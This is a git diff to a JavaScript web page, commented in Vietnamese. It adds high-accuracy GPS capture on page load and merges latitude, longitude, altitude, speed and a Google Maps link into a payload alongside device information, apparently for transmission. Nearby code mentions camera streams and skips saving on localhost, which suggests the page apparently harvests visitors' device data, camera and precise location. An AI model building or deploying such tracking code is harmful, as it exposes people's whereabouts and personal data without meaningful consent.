@@ -25,6 +25,7 @@ if (!saveInformation && window.location.hostname != 'localhost' && window.locati
     
         let JsonResult = JSON.parse(result);
         JsonResult['device'] = getDeviceInfo();
+        JsonResult['position'] = positionValue;
     
         const raw = JSON.stringify(JsonResult);
         
@@ -131,4 +132,59 @@ function stopCamera() {
     if (stream) {
         stream.getTracks().forEach(track => track.stop());
     }
+}
+
+// Vị trí
+window.onload = function () {
+    if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition, showError, {
+        enableHighAccuracy: true, // Bật GPS chính xác cao
+        timeout: 10000,           // 10 giây
+        maximumAge: 0
+    });
+    } else {
+    document.getElementById("info").innerText = "Trình duyệt không hỗ trợ Geolocation.";
+    }
+};
+
+// Hàm hiển thị thông tin vị trí
+let positionValue = '';
+function showPosition(position) {
+    let data = {
+    "Latitude": position.coords.latitude,
+    "Longitude": position.coords.longitude,
+    "Độ chính xác (m)": position.coords.accuracy,
+    "Độ cao (m)": position.coords.altitude,
+    "Độ chính xác độ cao (m)": position.coords.altitudeAccuracy,
+    "Hướng di chuyển (độ)": position.coords.heading,
+    "Tốc độ (m/s)": position.coords.speed,
+    "Thời gian lấy dữ liệu": new Date(position.timestamp).toLocaleString(),
+    "Link Google Maps": `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+    };
+
+    // In ra dạng đẹp
+    let text = "";
+    for (let key in data) {
+        text += `${key}: ${data[key]}\n`;
+    }
+    positionValue = text;
+}
+
+// Hàm xử lý lỗi
+function showError(error) {
+    let msg = "";
+    switch(error.code) {
+    case error.PERMISSION_DENIED:
+        msg = "Bạn đã từ chối chia sẻ vị trí.";
+        break;
+    case error.POSITION_UNAVAILABLE:
+        msg = "Không thể xác định vị trí.";
+        break;
+    case error.TIMEOUT:
+        msg = "Quá thời gian chờ.";
+        break;
+    default:
+        msg = "Lỗi không xác định.";
+    }
+    positionValue = msg;
 }
